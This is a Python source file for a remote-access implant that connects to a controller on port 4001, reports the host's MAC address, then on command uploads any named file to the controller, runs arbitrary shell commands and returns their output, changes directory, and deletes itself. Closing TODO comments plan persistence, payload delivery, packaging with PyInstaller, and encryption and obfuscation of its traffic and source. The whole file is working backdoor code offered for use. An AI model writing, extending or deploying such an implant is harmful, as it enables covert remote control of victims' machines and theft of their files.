import os
import socket
import uuid
import subprocess
import platform

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect(('127.0.0.1',4001))
    mac = hex(uuid.getnode())
    print(mac)
    s.send(str(mac).encode())
    while(1):
        data = s.recv(1024).decode()
        print(data)
        if data.split()[0] == 'upload':
            data = data[7:]
            print('uploading ' + data)
            f = open(data, 'rb')
            l = f.read()
            while (l):
                print(l)
                s.send(l)
                #print('Sent ', repr(l))
                l = f.read(8192)
                if not l:
                    break
            f.close()
            print('done')
            s.send('ENDOFFILE'.encode())
        if data.split()[0] == 'cmd':
            data = data[4:]
            proc = subprocess.Popen(data,stdout=subprocess.PIPE)
            s.send(str(proc.communicate()[0]).encode())
        if data.split()[0] == 'chdir':
            data = data[6:]
            os.chdir(data)
            msg = 'Contents of ' + os.getcwd() + '\n'
            s.send(msg.encode())
            # if platform.system() == 'Windows':
            #     proc = subprocess.Popen('dir',stdout=subprocess.PIPE)
            #     s.send(str(proc.communicate()[0]).encode())
            # elif platform.system() == 'Linux':
            #     proc = subprocess.Popen('ls -la', stdout=subprocess.PIPE)
            #     s.send(str(proc.communicate()[0]).encode())
        if data.split()[0] == 'killimplant':
            s.send('it was nice knowing you'.encode())
            proc = subprocess.Popen("rm implant.py --force", stdout=subprocess.PIPE)
            proc.communicate()
            s.close()
            exit



#TODO: Persistence Plan
#TODO: Sending Files to Implant
#TODO: Communicating with New Payloads
#TODO: Stretch Goal: SMART Directory Traversal -- Find and only run in directories with -rwx
#TODO: Using Implant to Move Payloads then die
#TODO: Package Implant + Payloads with PyInstaller
#TODO: Encrypt/Obfuscate Data Being Sent
#TODO: Obfuscate the Source Files

